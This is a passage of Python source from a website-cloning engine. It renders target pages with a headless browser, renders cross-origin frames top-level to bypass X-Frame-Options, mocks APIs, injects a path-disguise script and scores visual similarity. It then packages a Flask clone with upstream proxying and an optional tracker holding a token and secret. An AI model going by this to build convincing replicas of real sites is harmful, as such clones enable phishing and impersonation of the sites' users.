        """整页截图 + 第三方广告位遮罩(评分口径, 见 AD_RECTS_JS)。"""
        if label == "原站" and config.SCORE_MASK_ADS:
            self._ad_rects = []
            with suppress(Exception):
                self._ad_rects = page.evaluate(AD_RECTS_JS) or []
        self._full_shot_raw(page, path, label, _fresh)
        rects = getattr(self, "_ad_rects", None)
        if rects and label in ("原站", "克隆页", "保真轨"):
            with suppress(Exception):
                _mask_rects(path, rects)

    def _full_shot_raw(self, page, path, label="截图", _fresh=False):
        """整页截图, 三级退化:
        1) 整页截图(SHOT_TIMEOUT);
        2) 限高裁剪截图: 高度取评分覆盖区(SCORE_MAX_HEIGHT 等比换算)与 GPU 纹理上限的较小值;
        3) 视口分块拼接: 逐屏滚动截视口再拼(超高/滚动驱动页 captureScreenshot 整体失败时)。
        评分只取等比缩放后前 SCORE_MAX_HEIGHT 像素, 2/3 覆盖评分全部区域, 口径不变。
        超出评分覆盖区的超长页直接走限高截图: 尾部不计分, 整页截图在超长页上慢一个
        数量级(41000px 合成页 4.6s → 0.6s), 且超大 PNG 拖慢后续评分/校准解码。"""
        dims_js = ("() => [document.documentElement.clientWidth || innerWidth, "
                   "Math.max(document.documentElement.scrollHeight, "
                   "document.body ? document.body.scrollHeight : 0, innerHeight), "
                   "innerHeight]")
        dims = None
        with suppress(Exception):
            dims = page.evaluate(dims_js)
        if dims:
            w = max(1, int(dims[0]))
            cap = min(int(SCORE_MAX_HEIGHT * w / SCORE_WIDTH), SHOT_MAX_TEXTURE)
            if int(dims[1]) > cap:
                try:
                    page.screenshot(path=str(path), full_page=True,
                                    clip={"x": 0, "y": 0, "width": w, "height": cap},
                                    timeout=config.SHOT_TIMEOUT)
                    self.log("RENDER", f"{label}超长({int(dims[1])}px > 评分区 {cap}px), "
                                       f"限高截图")
                    return
                except Exception as exc:
                    self.log("WARN", f"{label}限高截图失败, 改走整页截图: {str(exc)[:160]}")
        try:
            page.screenshot(path=str(path), full_page=True, timeout=config.SHOT_TIMEOUT)
            return
        except Exception as exc:
            self.log("WARN", f"{label}整页截图失败, 退化为限高截图: {str(exc)[:160]}")
        dims = page.evaluate(dims_js)
        w = max(1, int(dims[0]))
        cap = min(int(SCORE_MAX_HEIGHT * w / SCORE_WIDTH), SHOT_MAX_TEXTURE)
        h = max(1, min(int(dims[1]), cap))
        try:
            page.screenshot(path=str(path), full_page=True, animations="disabled",
                            clip={"x": 0, "y": 0, "width": w, "height": h},
                            timeout=config.SHOT_TIMEOUT)
            return
        except Exception as exc:
            self.log("WARN", f"{label}限高截图失败, 退化为视口分块拼接: {str(exc)[:160]}")
        view_h = int(dims[2]) if len(dims) > 2 and dims[2] else 0
        try:
            self._tiled_shot(page, path, w, h, max(1, view_h))
        except Exception:
            # 连视口截图都失败: 记录页面形态(超大元素/超大变换常致 GPU 回读失败)供归因
            with suppress(Exception):
                diag = page.evaluate(SHOT_DIAG_JS)
                self.log("WARN", f"{label}截图全部失败, 页面形态: {json.dumps(diag, ensure_ascii=False)[:600]}")
            # 本地页(沙盒/MHTML)可在独立的禁 GPU 浏览器里重开重截: 同一浏览器的 GPU 进程
            # 被前面的重 WebGL 页拖垮后, 该浏览器内所有截图都会 Unable to capture
            url = page.url or ""
            if _fresh or not url.startswith(("http://127.0.0.1", "file://")):
                raise
            self._fresh_browser_shot(page, url, path, label)

    def _inline_blob_urls(self, page, html: str) -> str:
        """blob: URL 只在原页面会话内有效(运行时生成的纹理/图片/字体, 常见于 JS 生成的
        点阵、渐变贴图), 离线回放与 MHTML 都解析不了 → 采集时在原页取字节内联为 data:。"""
        blobs = list(dict.fromkeys(BLOB_URL_RE.findall(html)))[:BLOB_INLINE_MAX]
        if not blobs:
            return html
        try:
            data = page.evaluate(BLOB_FETCH_JS, blobs) or {}
        except Exception as exc:
            self.log("WARN", f"blob: 资源内联失败: {exc}")
            return html
        for u, d in data.items():
            if d:
                html = html.replace(u, d)
        self.log("RENDER", f"blob: 资源内联 {len(data)}/{len(blobs)} 个(运行时生成, 离线不可解析)")
        return html

    def _fresh_browser_shot(self, page, url, path, label):
        browser = page.context.browser.browser_type.launch(
            headless=True, args=["--disable-gpu", "--disable-dev-shm-usage"])
        try:
            fresh = browser.new_page(viewport=page.viewport_size)
            fresh.set_default_timeout(30000)
            # 与沙盒评分同口径: 只放行本地源与内联协议, 外联一律中止(不回源)
            parts = urlsplit(url)
            local = (f"{parts.scheme}://{parts.netloc}" if parts.netloc else "file:",
                     "data:", "blob:", "cid:", "file:")

            def _guard(route):
                with suppress(Exception):
                    if route.request.url.startswith(local):
                        route.continue_()
                    else:
                        route.abort()
            fresh.route("**/*", _guard)
            fresh.goto(url, wait_until="load", timeout=30000)
            with suppress(Exception):
                self._settle(fresh)
            self._full_shot(fresh, path, label, _fresh=True)
            self.log("RENDER", f"{label}截图改在独立浏览器(禁 GPU)完成")
        finally:
            with suppress(Exception):
                browser.close()

    @staticmethod
    def _tiled_shot(page, path, width, height, view_h):
        """逐屏滚动截视口并按实际滚动位置拼接(滚不动即到底)。"""
        canvas = Image.new("RGB", (width, height), "white")
        y = 0
        while y < height:
            actual = page.evaluate(f"() => {{ window.scrollTo(0, {y}); return window.scrollY; }}")
            page.wait_for_timeout(120)
            tile = Image.open(io.BytesIO(page.screenshot(full_page=False,
                                                          timeout=config.SHOT_TIMEOUT)))
            tile = tile.convert("RGB")
            top = int(actual) if isinstance(actual, (int, float)) else y
            canvas.paste(tile, (0, top))
            if top + tile.height >= height or top < y:
                break
            y = top + view_h
        with suppress(Exception):
            page.evaluate("() => window.scrollTo(0, 0)")
        canvas.save(str(path))

    def _settle(self, page, cap_ms: int = None, quiet_ms: int = None):
        """截图前缓释: DOM 静置即走(MutationObserver), settle_ms 只是上限。
        旧实现固定睡满 settle_ms(2.5s), 每轮渲染/校准/保真轨都付一次。"""
        cap = int(self._strategy_pack.settle_ms if cap_ms is None else cap_ms)
        quiet = int(self._strategy_pack.settle_quiet_ms if quiet_ms is None else quiet_ms)
        if quiet <= 0 or quiet >= cap:
            page.wait_for_timeout(cap)
            return
        started = time.time()
        try:
            installed = bool(page.evaluate(SETTLE_INSTALL_JS, {"quiet": quiet}))
        except Exception:
            installed = False
        if not installed:
            page.wait_for_timeout(cap)
            return
        try:
            # DOM 连续 quiet ms 无变动且图片/字体就绪即返回; 超时 = 等满上限(旧行为)。
            # 脚本被禁用的页面(MHTML)定时器不触发, 谓词只评估一次 → 走超时, 等满上限。
            page.wait_for_function(SETTLE_READY_JS, timeout=cap, polling=50)
        except Exception as exc:
            if type(exc).__name__ != "TimeoutError":
                remain = cap - int((time.time() - started) * 1000)
                if remain > 0:
                    page.wait_for_timeout(remain)
        finally:
            with suppress(Exception):
                page.evaluate(SETTLE_CLEANUP_JS)

    # ------------------------------------------------------------------
    def _ai_config(self):
        """任务级 AI 配置合并(> 环境变量 > config 默认); 无 Key 返回 None。"""
        base_url = (self.cfg.get("ai_base_url") or "").strip() or config.AI_API_BASE_URL
        api_key = (self.cfg.get("ai_api_key") or "").strip() or config.AI_API_KEY
        model = (self.cfg.get("ai_model") or "").strip() or config.AI_MODEL
        if not api_key:
            return None
        return {"base_url": base_url.rstrip("/"), "api_key": api_key, "model": model}

    # ------------------------------------------------------------------
    def _execute(self, origin: str, domain: str):
        exec_started = time.time()
        viewport = config.VIEWPORTS.get(self.cfg.get("viewport", "desktop"),
                                        config.VIEWPORTS["desktop"])
        ctx_headers = {}
        if self.cfg.get("cookie"):
            ctx_headers["Cookie"] = self.cfg["cookie"]
        if self.cfg.get("bearer"):
            ctx_headers["Authorization"] = f"Bearer {self.cfg['bearer']}"
        ua = self.cfg.get("user_agent") or config.DEFAULT_USER_AGENT

        pages = []          # [(route, html)]
        iframe_pages = []   # [(src, html)] 同源 iframe 固化子页
        frame_records = []  # [(src, html)] 跨域 iframe 顶级渲染固化子页
        assets = set()      # 待下载绝对 URL
        srcset_map = {}     # 候选 URL -> 最优 URL(全部指向同一本地文件)
        original_text = ""

        def merge_page_assets(result):
            assets.update(result.get("urls", []))
            for raw, absolute in result.get("rawRefs", []) or []:
                if raw and absolute and len(raw) > 5:
                    self._raw_refs[raw] = absolute
            for raw in result.get("srcsets", []):
                best, candidates = _parse_best_srcset(raw, self._target)
                if best is None:
                    continue
                assets.add(best)
                for candidate in candidates:
                    if candidate != best:
                        srcset_map[candidate] = best

        pages_map = {}
        mock_entries = []
        score = None
        detail = None
        ai_report = None

        with self.pool.context(
            viewport={"width": viewport["width"], "height": viewport["height"]},
            user_agent=ua, extra_headers=ctx_headers,
        ) as ctx:
            main = self._render_page(ctx, self._target, screenshot=True,
                                     collect_links=True)
            merge_page_assets(main)
            original_text = main.get("text") or ""
            (self.ws / "original_text.txt").write_text(original_text, encoding="utf-8")
            if main.get("state") is not None:
                # Cookie/Storage 终态快照: 克隆页启动时前置恢复, 版本守卫自洽
                (self.ws / "state_snapshot.json").write_text(
                    json.dumps(main["state"], ensure_ascii=False), encoding="utf-8")
            for frame in main.get("iframes", []):
                merge_page_assets(frame)
                iframe_pages.append((frame["src"], frame["html"]))
            if iframe_pages:
                self.log("RENDER", f"固化 {len(iframe_pages)} 个同源 iframe 子页面")
            pages.append(("/", main["html"]))

            # ---- 跨域 iframe 递归克隆(顶级页面渲染, 绕过 X-Frame-Options) ----
            self._collect_frame_pages(ctx, main, frame_records, merge_page_assets,
                                      depth=1, target_url=self._target)
            if frame_records:
                self.log("RENDER", f"固化 {len(frame_records)} 个跨域 iframe 子页面(frames/*.html)")
                # iframe 文本并入原站文本指纹(与克隆侧同源 iframe 采集口径一致)
                original_text += "\n" + "\n".join(
                    text for _src, _html, text in frame_records if text)
                (self.ws / "original_text.txt").write_text(original_text, encoding="utf-8")

            self._set(progress=22, stage="CSSOM提取")

            # ---- 同域名多页面 BFS 发现 ----
            if self.cfg.get("mode") == "crawler" and int(self.cfg.get("max_pages", 1)) > 1:
                max_pages = min(int(self.cfg.get("max_pages", 1)), config.MAX_PAGES_LIMIT)
                queue = deque(main["links"])
                visited = {"/"}
                guard = 0
                while queue and len(pages) < max_pages and guard < 80:
                    guard += 1
                    path = queue.popleft()
                    if path in visited:
                        continue
                    visited.add(path)
                    self.log("CRAWL", f"抓取子页面 {path}")
                    try:
                        sub = self._render_page(ctx, origin + path,
                                                screenshot=False, collect_links=False)
                    except Exception as exc:
                        self.log("WARN", f"子页面失败 {path}: {exc}")
                        continue
                    merge_page_assets(sub)
                    for frame in sub.get("iframes", []):
                        merge_page_assets(frame)
                        iframe_pages.append((frame["src"], frame["html"]))
                    self._collect_frame_pages(ctx, sub, frame_records,
                                              merge_page_assets, depth=1,
                                              target_url=self._target)
                    pages.append((path, sub["html"]))

            mock_entries = self._finalize_mocks()
            if self.cfg.get("mock_api", True):
                self.log("MOCK-API", f"共录制 {len(mock_entries)} 个 JSON 接口")
            # Mock 先落盘: 本地沙盒评分服务器需要据此响应克隆页的运行时接口调用
            (self.ws / "mock_data.json").write_text(
                json.dumps(mock_entries, ensure_ascii=False, indent=2),
                encoding="utf-8")
            # VCR 网络磁带落盘(W2): 沙盒按模式策略包开关决定是否回放
            if self._net_tape:
                (self.ws / "net_tape.json").write_text(
                    json.dumps(self._net_tape, ensure_ascii=False),
                    encoding="utf-8")
                self.log("VCR", f"网络磁带: 录制 {len(self._net_tape)} 条响应 "
                                f"({self._tape_bytes // 1024} KB)")

            # ---- CAS 并发下载 + CSS 递归解析(requests -> 浏览器会话降级) ----
            self._set(progress=30, stage="CAS并发下载")
            assets.add(origin.rstrip("/") + "/favicon.ico")
            results = self._materialize(assets, origin, ctx=ctx)
            self.log("INFO", f"资源池落地完成: {len(results)} 个文件 "
                             f"(浏览器会话救回 {self.downloader.browser_rescues} 个)")

            # ---- 活体会话请求差集回补 ----
            self._set(progress=48, stage="活体回补")
            rescued = self._live_backfill(ctx, results, origin)
            if rescued:
                self.log("SMART-DL", f"活体差集回补: 追加 {rescued} 个浏览器实际加载过的资源")

            mirrored = self._mirror_runtime_paths(results)
            if mirrored:
                self.log("SMART-DL", f"运行时路径镜像: {mirrored} 个脚本拼址加载的资源按原路径落盘"
                                     f"(MSE 视频/场景/贴图, 字面替换改写不到)")

            # ---- Mock 响应体资产收割: API 下发的图片/资源是静态提取盲区 ----
            harvested = self._harvest_mock_assets(ctx, mock_entries, results, origin)
            if harvested:
                self.log("SMART-DL", f"Mock 资产收割: 录制响应体中追加下载 {harvested} 个资源")

            # ---- 渲染驱动修复循环: 本地化 -> 离线渲染评分 -> 404 回补 -> 重来 ----
            routes = {route for route, _ in pages}
            want_score = self.cfg.get("similarity", True) and \
                (self.ws / "original_preview.png").is_file()
            # 框架模式识别(W1): JS 字节+DOM 双指纹 → 模式策略包(一类一策地基)。
            # 静态资源已落盘, 证据齐备; 识别失败回落 DEFAULT 不阻断主流程。
            try:
                # DOM 证据取采集期主页面渲染 DOM(此时 index.html 尚未本地化落盘)
                self._pattern_info = pattern_detector.detect(
                    self.ws, html=pages[0][1] if pages else None,
                    runtime=getattr(self, "_runtime_hits", None))
                self._strategy_pack = strategy_packs.for_pattern(
                    self._pattern_info["pattern"])
                self.log("PATTERN",
                         f"识别模式 {self._pattern_info['pattern']} "
                         f"(置信 {self._pattern_info['confidence']:.2f}, 特征: "
                         f"{','.join(self._pattern_info['features']) or '无'})")
            except Exception as exc:
                self._strategy_pack = strategy_packs.for_pattern("DEFAULT")
                self.log("WARN", f"模式识别失败, 使用默认策略包: {exc}")
            # 热力图延迟: 中间修复轮不写 diff_preview.png, 收敛后统一生成一次
            render_and_score = self._make_render_and_score(ctx, defer_diff=True)

            repair_started = time.time()
            prev_sig, prev_score = None, None   # 收敛判定: 上一轮缺失数与分数
            stale_prev = False                   # 上一轮回补是否也未涨分
            best = None                          # 最优轮快照(修复轮回退时恢复)
            for round_i in range(max(1, config.RENDER_REPAIR_ROUNDS)
                                 if want_score else 1):
                # P0-A 时间预算: 快站快修, 慢站限时收敛 —— 速度是引擎一等公民
                if time.time() - repair_started > config.REPAIR_TIME_BUDGET:
                    self.log("RENDER", f"修复循环时间预算耗尽"
                             f"({config.REPAIR_TIME_BUDGET}s), 提前收敛")
                    break
                self._set(progress=62 + round_i * 6,
                          stage="资源重写" if round_i == 0 else f"修复循环第{round_i + 1}轮")
                tp = time.monotonic()
                pairs = self._compose_pairs(results, routes, origin, srcset_map,
                                            iframe_pages, frame_records)
                self._localize(pages, iframe_pages, frame_records, pairs, pages_map)
                self._rewrite_js_files(results, pairs)
                self._rewrite_mock_bodies(mock_entries, pairs)
                self._phase("本地化重写", tp)
                if not want_score:
                    break
                detail, failed_local, remote_missing = render_and_score()
                self.db.touch_task(self.task_id)   # 心跳: 长渲染防误收割
                if detail is not None:
                    score = detail["score"]
                    self.log("SIMILARITY",
                             f"视觉还原度 {score}% (结构 {detail['structure']:.0%} / "
                             f"边缘 {detail['edge']:.0%} / 文本 {detail['text']:.0%})")
                    for warning in detail.get("warnings", []):
                        self.log("WARN", f"[评分告警] {warning}")
                    if best is None or score > best["detail"]["score"]:
                        best = self._snapshot_round(round_i, detail, results)
                if not failed_local and not remote_missing:
                    break
                # 无进展即停: 上一轮回补之后缺失数没减少、分数也没涨 —— 回补已无能为力
                # (缺失资源上游本就 404/鉴权, 或带时间戳/随机参数每轮都"不同"),
                # 再跑只是重复本地化+渲染(真实语料里 wordpress/runoob/wix 都是 6 轮
                # 分数一动不动)。比较缺失数而非集合: 埋点 URL 的随机参数让集合每轮都变
                missing_n = len(failed_local) + len(remote_missing)
                cur = detail["score"] if detail is not None else None
                no_gain = (prev_score is not None and cur is not None
                           and cur - prev_score < config.REPAIR_MIN_GAIN)
                # 连续两轮回补都不涨分: 缺失数虽在下降, 回补的是登录/埋点/接口这类
                # 不可见请求(真实语料 jd 三轮 77.0 不动, 缺失 17→11 仍在跑)
                stale = no_gain and stale_prev
                if prev_sig is not None and (stale or (missing_n >= prev_sig and (
                        cur is None or prev_score is None or no_gain))):
                    self.log("RENDER", f"修复循环无进展(缺失 {prev_sig}→{missing_n}, "
                                       f"分数 {prev_score}→{cur}), 第 {round_i + 1} 轮收敛")
                    break
                prev_sig, prev_score, stale_prev = missing_n, cur, no_gain
                if round_i >= config.RENDER_REPAIR_ROUNDS - 1:
                    self.log("SMART-DL",
                             f"仍有 {len(failed_local) + len(remote_missing)} 个本地缺失资源"
                             f"(回补轮数已用尽): {sorted(failed_local | {urlsplit(u).path for u in remote_missing})[:6]}")
                    break
                self.log("SMART-DL", f"本轮缺失 {missing_n}: "
                                     f"{sorted(failed_local)[:8]} / 外联 {len(remote_missing)}")
                tp = time.monotonic()
                new, shadows = self._failed_backfill(ctx, failed_local,
                                                    remote_missing, results, origin)
                self._phase("修复回补下载", tp)
                if not new and not shadows:
                    break
                results.update(new)

            # 修复轮不保证单调(回补进来的埋点/广告资源可能让克隆页更偏离原站):
            # 末轮低于最优轮时恢复最优轮产物(页面/新增文件/截图/校准样式), 交付与分数一致
            if best is not None and detail is not None and \
                    detail["score"] < best["detail"]["score"] - 0.05:
                self._restore_round(best, results)
                self.log("RENDER", f"修复轮回退({detail['score']}→最优 {best['detail']['score']}), "
                                   f"已恢复第 {best['round'] + 1} 轮产物")
                detail = best["detail"]
                score = detail["score"]

            if want_score and detail is not None:
                self._write_final_diff()

            # ---- 智能 Mock(表单解析, 可选 LLM 润色) ----
            html_sources = []
            for name in ("index.html",):
                file = self.ws / name
                if file.is_file():
                    html_sources.append(file.read_text(encoding="utf-8", errors="replace"))
            for i in range(1, len(frame_records) + 1):
                file = self.ws / "frames" / f"frame_{i}.html"
                if file.is_file():
                    html_sources.append(file.read_text(encoding="utf-8", errors="replace"))
            smart_mocks = ai_mock_generator.generate_smart_mocks(
                html_sources, mock_entries, self._ai_config(), self.log)
            if smart_mocks:
                mock_entries = mock_entries + smart_mocks
                self.log("MOCK-API", f"智能表单 Mock: 追加 {len(smart_mocks)} 个路由")

            (self.ws / "mock_data.json").write_text(
                json.dumps(mock_entries, ensure_ascii=False, indent=2),
                encoding="utf-8")

            # ---- AI 视觉闭环(门控: 低分 + 已配置 Key + 模式策略包允许) ----
            ai_cfg = self._ai_config()
            if self.cfg.get("ai_vision_repair") and want_score and detail is not None \
                    and time.time() - exec_started > config.AI_TIME_BUDGET:
                self.log("AI-VISION", "任务时间预算已耗尽, 跳过 AI 修复轮(P0-A 速度调度)")
            elif self.cfg.get("ai_vision_repair") and want_score and detail is not None:
                if ai_cfg is None:
                    self.log("AI-VISION", "未配置大模型 API Key, 视觉闭环修复跳过"
                                         "(可在高阶配置填写或设置 CLONER_AI_KEY)")
                elif not self._strategy_pack.ai_vision_repair:
                    self.log("AI-VISION",
                             f"模式 {self._pattern_info['pattern']} 策略包豁免 AI 修复"
                             "(实证该模式下 AI 补丁中性偏负)")
                elif score is not None and score >= config.AI_REPAIR_TRIGGER_SCORE:
                    self.log("AI-VISION",
                             f"诚实评分 {score}% >= 门限 {config.AI_REPAIR_TRIGGER_SCORE:.0f}%, 无需 AI 修复")
                else:
                    self._set(progress=86, stage="AI视觉修复")
                    self.log("AI-VISION",
                             f"评分 {score}% 低于门限 {config.AI_REPAIR_TRIGGER_SCORE:.0f}%, "
                             f"启动大模型视觉闭环 (模型: {ai_cfg['model']})")
                    try:
                        ai_report = ai_vision_repair.run_vision_repair(
                            self.ws, ai_cfg, detail, self.log, render_and_score,
                            page_file=self._main_page_file(),
                            region_cells=self._region_cells())
                        if ai_report.get("final_score") is not None:
                            score = ai_report["final_score"]
                            detail = dict(detail or {})
                            detail["score"] = score
                        if any(r.get("score_after") is not None and not r.get("rolled_back")
                               for r in ai_report.get("rounds", [])):
                            self._write_final_diff()   # 产物被 AI 补丁改过, 热力图随之更新
                    except Exception as exc:
                        self.log("AI-VISION", f"视觉闭环异常: {type(exc).__name__}: {exc}")
                        ai_report = {"error": f"{type(exc).__name__}: {exc}"}

            if detail is not None:
                detail = dict(detail)
                if ai_report:
                    detail["ai_repair"] = {
                        k: ai_report.get(k) for k in ("rounds", "final_score", "error")
                        if ai_report.get(k) is not None}
                # N1 保真轨: MHTML 确定性渲染的相似度(与交互轨分数分开记账)
                if getattr(self, "_fidelity_score", None) is not None:
                    detail["fidelity_score"] = self._fidelity_score
                (self.ws / "similarity_detail.json").write_text(
                    json.dumps(detail, ensure_ascii=False, indent=2),
                    encoding="utf-8")

            site_meta = {
                "task_id": self.task_id, "domain": domain, "upstream": origin,
                "routes": pages_map,
                "proxy_enabled": bool(self.cfg.get("proxy_fallback", True)),
                "similarity": score,
                "similarity_detail": detail,
                "fidelity_score": getattr(self, "_fidelity_score", None),
                "frames": [f"/frames/frame_{i + 1}.html" for i in range(len(frame_records))],
                "pattern": getattr(self, "_pattern_info", {}).get("pattern", "DEFAULT"),
            }
            (self.ws / "site.json").write_text(
                json.dumps(site_meta, ensure_ascii=False, indent=2),
                encoding="utf-8")

        # ---- 生成 Flask 工程 + ZIP ----
        self._set(progress=92, stage="Flask构建打包")
        tracker_cfg = self.db.get_tracker_config(self.task_id)
        bake_cfg = None
        if tracker_cfg and tracker_cfg.get("enabled"):
            from core import security
            bake_cfg = {
                "token": security.decrypt_value(tracker_cfg.get("token", "")),
                "secret": security.decrypt_value(tracker_cfg.get("secret_enc", "")),
                "keyword": tracker_cfg.get("keyword", ""),
                "slots": tracker_cfg.get("slots") or [],
                "mask": bool(tracker_cfg.get("mask", True)),
            }
        zip_path = flask_generator.generate_project(
            self.task_id, origin, self.ws, pages_map,
            mock_entries, bool(self.cfg.get("proxy_fallback", True)),
            tracker_hook="",
            tracker_cfg=bake_cfg,
        )
        self.log("BUILD", f"Flask 工程已生成: {zip_path.name}")

        stats = self._collect_stats()
        stats["api"] = len(mock_entries)
        if detail is not None:
            stats["similarity_detail"] = detail
        # 端到端度量: 识别结果与阶段耗时随任务落库, 真实语料跑分直接读取, 不翻日志
        stats["pattern"] = self._pattern_info.get("pattern", "DEFAULT")
        stats["pattern_confidence"] = round(float(self._pattern_info.get("confidence", 0.0) or 0.0), 2)
        stats["pattern_features"] = list(self._pattern_info.get("features", []) or [])
        stats["calibrations"] = self._calibrations
        stats["stage_times"] = self._stage_times()
        stats["phase_times"] = self._phase_times()
        stats["elapsed_s"] = round(sum(stats["stage_times"].values()), 1)
        # 双轨取优: 引擎能力 = max(交互轨重演, 保真轨 MHTML 确定性渲染)。
        # 两轨是同一采集的两个交付物, 取更能保真者作为任务还原度。
        fidelity = getattr(self, "_fidelity_score", None)
        # 双轨明细恒记账: 头条分数取优的同时, 两轨原值都可追溯(诚实口径)
        stats["interactive_score"] = score if isinstance(score, (int, float)) else None
        stats["fidelity_score"] = fidelity if isinstance(fidelity, (int, float)) else None
        stats["dominant_track"] = "interactive"
        stats["score_baseline"] = "pristine"   # 基准截图取自 DOM 改动前(v4.5 起)
        blocked = self._detect_blocked()
        if blocked:
            stats["baseline_blocked"] = blocked
            self.log("WARN", f"环境受阻: {blocked}; 本任务分数不反映引擎能力")
        if isinstance(fidelity, (int, float)) and \
                (not isinstance(score, (int, float)) or fidelity > score):
            score = fidelity
            stats["dominant_track"] = "fidelity"
        self._set(status="completed", progress=100, stage="完成",
                  similarity_score=score, stats_json=json.dumps(stats, ensure_ascii=False),
                  zip_path=str(zip_path))
        self.db.increment_completed(self.task["batch_id"])

    def _detect_blocked(self) -> str:
        def _read(name):
            f = self.ws / name
            try:
                return f.read_text(encoding="utf-8", errors="replace") if f.is_file() else ""
            except OSError:
                return ""
        orig = _read("original_text.txt")
        if not orig:
            return ""
        # 看采集快照(保真轨文本 = 采集时刻的 DOM): 快照里已是拦截页才算环境受阻。
        # 只有交互轨回放变成拦截页(回放时活体请求被风控)是交付物缺陷, 不在此豁免;
        # 没有保真轨时退回交互轨文本
        captured = _read("fidelity_text.txt") or _read("cloned_text.txt")
        return detect_blocked_page(orig, captured)

    # ------------------------------------------------------------------
    @staticmethod
    def _inject_spa_disguise(html: str, route: str) -> str:
        script = SPA_DISGUISE_TEMPLATE.replace(
            "__ORIG_PATH_JSON__", _safe_json(route or "/")
        )
        match = re.search(r"<head[^>]*>", html, re.I)
        if match:
            insert_at = match.end()
            return html[:insert_at] + script + html[insert_at:]
        return script + html

    def _probe_viewports(self, page):
        """活体页依次缩到平板/手机宽再还原, 记录各视口下的内联样式(见 CV_RECORD_JS)。
        只在桌面宽采集时做; 还原后等脚本静置, 基准截图在此之后, 口径不受影响。"""
        vp = page.viewport_size or {}
        width, height = vp.get("width") or 0, vp.get("height") or 0
        if width < 1024 or not self.cfg.get("viewport_probe", True):
            return
        t0 = time.monotonic()
        try:
            n = page.evaluate(CV_RECORD_JS, "d")
            for tag, w in (("t", 768), ("m", 390)):
                page.set_viewport_size({"width": w, "height": height})
                page.evaluate(CV_QUIET_JS, 250)
                page.evaluate(CV_RECORD_JS, tag)
            page.set_viewport_size({"width": width, "height": height})
            page.evaluate(CV_QUIET_JS, 300)
            page.evaluate("window.scrollTo(0, 0)")
            page.evaluate(CV_RECORD_JS, "b")
            self.log("RENDER", f"多视口内联采集: {n} 个元素 × 平板/手机视口 {time.monotonic() - t0:.1f}s")
            if self.cfg.get("viewport_reload", True):
                self._start_narrow_loads(page, height)
        except Exception as exc:
            with suppress(Exception):
                page.set_viewport_size({"width": width, "height": height})
            with suppress(Exception):
                page.evaluate("window.__cvRec = null")
            self.log("WARN", f"多视口内联采集失败: {exc}")

    def _start_narrow_loads(self, page, height):
        """同上下文另开平板/手机宽的页面重新加载目标页(只等到响应提交, 与主页后续采集并行):
        只在加载时按宽度写一次的内联样式, 缩放采不到, 要靠窄屏首载对照(见 CV_EMIT_JS)。"""
        self._cv_pages = []
        for tag, w in (("t", 768), ("m", 390)):
            p2 = None
            try:
                p2 = page.context.new_page()
                p2.set_viewport_size({"width": w, "height": height})
                p2.goto(page.url, wait_until="commit", timeout=10000)
                self._cv_pages.append((tag, p2))
            except Exception as exc:
                with suppress(Exception):
                    if p2 is not None:
                        p2.close()
                self.log("WARN", f"窄屏首载对照({w}px)启动失败: {str(exc)[:120]}")

    def _collect_narrow_loads(self, budget_s=8.0):
        """收回窄屏首载页的内联样式表并关页; 预算内没加载完的放弃。"""
        loads, t0 = {}, time.monotonic()
        for tag, p2 in getattr(self, "_cv_pages", []) or []:
            try:
                left = max(0.5, budget_s - (time.monotonic() - t0))
                p2.wait_for_load_state("load", timeout=int(left * 1000))
                p2.evaluate(CV_QUIET_JS, 300)
                loads[tag] = p2.evaluate(CV_PATHS_JS) or {}
            except Exception:
                pass
            finally:
                with suppress(Exception):
                    p2.close()
        self._cv_pages = []
        return loads

    def _bg_freeze_css(self):
        """A1-lite.2 背景色权威固化: 原站截图四边条带采样主背景色。

        纯色(方差低)→固化为 html,body !important 覆盖, 防克隆侧系统色/
        CSS 变量解析漂移; 渐变/图案背景(方差高)不固化, 避免误伤。"""
        png = self.ws / 'original_preview.png'
        if not png.is_file():
            return None
        try:
            im = Image.open(png).convert('RGB')
            w, h = im.size
            strips = [im.crop(box).resize((1, 1)).getpixel((0, 0)) for box in
                      ((0, 0, w, 12), (0, h - 12, w, h), (0, 0, 12, h), (w - 12, 0, w, h))]
            flat = [c for s in strips for c in s]
            mean = sum(flat) / len(flat)
            var = sum((v - mean) ** 2 for v in flat) / len(flat)
            if var > 40:
                return None
            r, g, b = (int(round(sum(s[i] for s in strips) / len(strips))) for i in range(3))
            return (f'<style data-clone-freeze="bg">html,body{{'
                    f'background-color:rgb({r},{g},{b})!important}}</style>')
        except Exception:
            return None

    # ------------------------------------------------------------------
    def _freeze_media_from_baseline(self, page):
        """空白 Canvas / 无帧视频: 从纯净基准截图裁出所在区域回填(见 MEDIA_SHOT_JS)。"""
        try:
            info = page.evaluate(MEDIA_SHOT_JS)
        except Exception as exc:
            self.log("WARN", f"媒体快照探测失败: {exc}")
            return
        shots = info.get("shots") or []
        crops = {}
        if shots:
            try:
                with Image.open(self.ws / "original_preview.png") as im:
                    im = im.convert("RGB")
                    scale = im.width / float(info.get("docW") or im.width)
                    for sh in shots[:config.MEDIA_SHOT_MAX]:
                        box = (int(sh["x"] * scale), int(sh["y"] * scale),
                               int((sh["x"] + sh["w"]) * scale), int((sh["y"] + sh["h"]) * scale))
                        box = (max(0, box[0]), max(0, box[1]),
                               min(im.width, box[2]), min(im.height, box[3]))
                        if box[2] - box[0] < 8 or box[3] - box[1] < 8:
                            continue
                        buf = io.BytesIO()
                        im.crop(box).save(buf, format="JPEG", quality=85)
                        crops[str(sh["n"])] = ("data:image/jpeg;base64,"
                                               + base64.b64encode(buf.getvalue()).decode("ascii"))
            except Exception as exc:
                self.log("WARN", f"媒体快照裁图失败: {exc}")
        try:
            applied = page.evaluate(MEDIA_SHOT_APPLY_JS, crops)
        except Exception as exc:
            self.log("WARN", f"媒体快照回填失败: {exc}")
            applied = 0
        if applied or info.get("posters"):
            self.log("RENDER", f"媒体快照: {info.get('posters', 0)} 个视频取当前帧作封面, "
                               f"{applied} 个空白 Canvas/无帧视频从基准截图回填")

    @staticmethod
    def _wait_quiet(page, cap_ms: int) -> bool:
        """渲染相关请求静置: QUIET_MS 内无新请求且在途请求都已完成或已挂起超过 STALE_MS。

        Playwright 的 networkidle 要求 500ms 内零连接, 埋点轮询/长连接/长轮询站点永远
        等满上限(huawei/jd 每站白等 9s)。挂起久的请求(长轮询、流式、卡死的第三方)不影响
        首屏渲染, 不再计入; 新请求还在冒出说明页面仍在装配, 照常等。"""
        quiet_s, stale_s = config.NAV_QUIET_MS / 1000, config.NAV_STALE_MS / 1000
        inflight, last = {}, [time.monotonic()]
        skip = ("websocket", "eventsource", "media", "manifest", "other")

        def _on_req(req):
            if req.resource_type in skip:
                return
            inflight[id(req)] = time.monotonic()
            last[0] = time.monotonic()

        def _on_done(req):
